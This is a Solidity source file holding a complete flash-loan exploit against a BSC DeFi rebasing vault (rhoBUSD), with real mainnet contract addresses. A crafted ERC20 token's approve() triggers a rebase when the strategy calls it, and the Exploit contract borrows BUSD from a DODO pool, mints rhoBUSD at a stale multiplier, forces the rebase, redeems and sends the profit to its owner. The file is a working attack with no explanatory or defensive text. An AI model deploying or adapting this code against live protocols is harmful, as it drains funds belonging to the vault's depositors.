pragma solidity ^0.6.0;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract Bank {
    function work(uint256 posId, uint256 pid, uint256 borrow, bytes calldata data) external {}
}

contract FlurryRebaseUpkeep {
    function performUpkeep(bytes calldata performData) external {}
}

contract ExploitToken is ERC20 {
    bool public attacked;  // only attack for the first time
    constructor(string memory name, string memory symbol) public ERC20(name, symbol) {
        _mint(msg.sender, 1000 * 10**18);
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        if (!attacked) {
            if (msg.sender == 0x5085c49828B0B8e69bAe99d96a8e0FCf0A033369 /* strategy address */) {
                attacked = !attacked;
                FlurryRebaseUpkeep(0xc8935Eb04ac1698C51a705399A9632c6FaeCa57f).performUpkeep("");
            }
        }
        return true;
    }
}

contract PancakeFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair) {}
}

contract PancakePair{
    address public token0;
    function balanceOf(address account) external view returns (uint256) {}
    function mint(address to) external returns (uint) {}
    function approve(address spender, uint256 amount) public {}
}

contract RhoToken {
     function getMultiplier() external view returns (uint256 _multiplier, uint256 _lastUpdateTime) {}
     function setRebasingOption(bool isRebasing) external {}
}

contract PancakeRouter {
    function removeLiquidity(address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline ) public returns (uint amountA, uint amountB) {}
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) public payable {}
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) public {}
}

contract DPPTrader {
    uint112 public _QUOTE_RESERVE_;
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external {}
}

contract Vault {
    function mint(uint256 amount) external {}
    function redeem(uint256 amountInRho) external {}
}

contract Exploit {
    address public lp;
    address public token;
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function preWork() payable public{
        address BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
        address pancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        address strategy = 0x5085c49828B0B8e69bAe99d96a8e0FCf0A033369;

        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = BUSD;
        PancakeRouter(pancakeRouter).swapExactETHForTokens{value: msg.value}(0, path, address(this), now);
        // swap for some BUSD(to this contract address) to inject liquidity.

        PancakeFactory pancakeFactory = PancakeFactory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
        token = address(new ExploitToken("exploitToken", "ET"));
        lp = pancakeFactory.createPair(token, BUSD);

        // mint some lp, send some to strategy and some to bob.
        require(ERC20(BUSD).balanceOf(address(this)) >= 1 * 10**18, "BUSD error");
        require(ERC20(token).balanceOf(address(this)) >= 1 * 10**18, "Token error");
        ERC20(BUSD).transfer(lp, 1 * 10**18);
        ERC20(token).transfer(lp, 1 * 10**18);
        PancakePair(lp).mint(address(this));
        ERC20(lp).transfer(strategy, 1 * 10**16);
        ERC20(lp).transfer(owner, 1 * 10**16);

        // send all token and ETH back to owner
        address[] memory pathBack = new address[](2);
        pathBack[0] = BUSD;
        pathBack[1] = WBNB;
        ERC20(BUSD).approve(pancakeRouter, uint(-1));
        PancakeRouter(pancakeRouter).swapExactTokensForETH(ERC20(BUSD).balanceOf(address(this)), 0, pathBack, owner, now);
        owner.call{value: address(this).balance}("");
    }

    function attack() public {
        DPPTrader flashloan = DPPTrader(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4);
        flashloan.flashLoan(0, flashloan._QUOTE_RESERVE_(), address(this), "1");
        // while calling flashLoan, DPPFlashLoanCall is called (https://bscscan.com/address/0x0fe261aee0d1c4dfddee4102e82dd425999065f4#code)
    }

    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        DPPTrader flashloan = DPPTrader(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4);
        address pancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
        address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        address rhoBUSD = 0x35CDC6bd2d9C4CDd7ddbDDB57593c274b31e4601;
        FlurryRebaseUpkeep flurryRebaseUpkeep = FlurryRebaseUpkeep(0xc8935Eb04ac1698C51a705399A9632c6FaeCa57f);

        require(ERC20(BUSD).balanceOf(address(this)) >= flashloan._QUOTE_RESERVE_(), "Loan BUSD failed");

        // buy rhoBUSD using low multiplier
        Vault vault = Vault(0xcf8BF12Af4C95D651f42dE2451Ae18969C1DdB8f);
        ERC20(BUSD).approve(address(vault), uint(-1));
        vault.mint(ERC20(BUSD).balanceOf(address(this)));

        // update multiplier
        RhoToken(rhoBUSD).setRebasingOption(true);
        flurryRebaseUpkeep.performUpkeep("");

        // sell rhoBUSD
        vault.redeem(ERC20(rhoBUSD).balanceOf(address(this)));

        // send BUSD back to DODO
        require(ERC20(BUSD).balanceOf(address(this)) > flashloan._QUOTE_RESERVE_(), "Redeem failed");
        ERC20(BUSD).transfer(address(flashloan), flashloan._QUOTE_RESERVE_());

        // send all token and ETH back to owner
        address[] memory pathBack = new address[](2);
        pathBack[0] = BUSD;
        pathBack[1] = WBNB;
        ERC20(BUSD).approve(pancakeRouter, uint(-1));
        PancakeRouter(pancakeRouter).swapExactTokensForETH(ERC20(BUSD).balanceOf(address(this)), 0, pathBack, owner, now);
        owner.call{value: address(this).balance}("");
    }

}
